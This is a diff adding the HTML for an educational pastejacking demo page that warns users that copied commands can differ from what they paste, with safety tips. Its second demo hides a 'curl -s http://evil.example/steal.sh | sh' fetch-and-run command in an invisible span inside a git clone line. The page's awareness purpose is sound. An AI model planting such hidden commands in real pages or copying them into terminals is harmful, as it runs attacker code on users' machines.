@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<!-- Pastejacking Demo — structure. Shared look: ../style.css, logic: script.js -->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pastejacking Demo – What You Copy Is Not What You Paste</title>
+  <meta name="description" content="A safe live demo of pastejacking: websites can secretly change what you copy.">
+  <link rel="icon" href="../favicon.svg">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body data-accent="amber">
+  <header class="topbar"><a class="home" href="../index.html">← All projects</a><span class="tag">Pastejacking Demo</span></header>
+
+  <main class="wrap">
+    <section class="hero">
+      <div class="icon">📋</div>
+      <h1>Paste<span>jacking</span></h1>
+      <p>What you copy is not always what you paste. Try it yourself: it's a safe demo, and nothing runs.</p>
+    </section>
+
+    <section class="card">
+      <h2>Demo 1 · The hijacked copy button</h2>
+      <p class="muted">A "tutorial" site asks you to install a package. Copy the command with the button, or select it and press Ctrl+C.</p>
+      <div class="code" id="code1">pip install requests</div>
+      <button id="copy1">📋 Copy command</button>
+    </section>
+
+    <section class="card">
+      <h2>Demo 2 · The invisible text</h2>
+      <p class="muted">Select the whole line below with your mouse and press Ctrl+C.</p>
+      <div class="code" id="code2">git clone https://github.com/Kanak234/demo<span class="hidden"> && curl -s http://evil.example/steal.sh | sh # </span> && cd demo</div>
+    </section>
+
+    <section class="card">
+      <h2>Now paste here (Ctrl+V)</h2>
+      <textarea id="paste" rows="3" aria-label="Paste area" placeholder="Paste what you copied…"></textarea>
+      <div id="verdict" aria-live="polite"></div>
+    </section>
+
+    <section class="card">
+      <h2>How to stay safe</h2>
+      <ul class="reasons">
+        <li><b>Never paste straight into a terminal.</b> Paste into Notepad first and read it.</li>
+        <li>Type short commands yourself.</li>
+        <li>Keep your terminal's multi-line paste warning turned on.</li>
+        <li>Copy commands only from official documentation.</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer>Educational demo: evil.example is a reserved, fake domain, and nothing is executed.</footer>
+  <script src="script.js"></script>
+</body>
+</html>
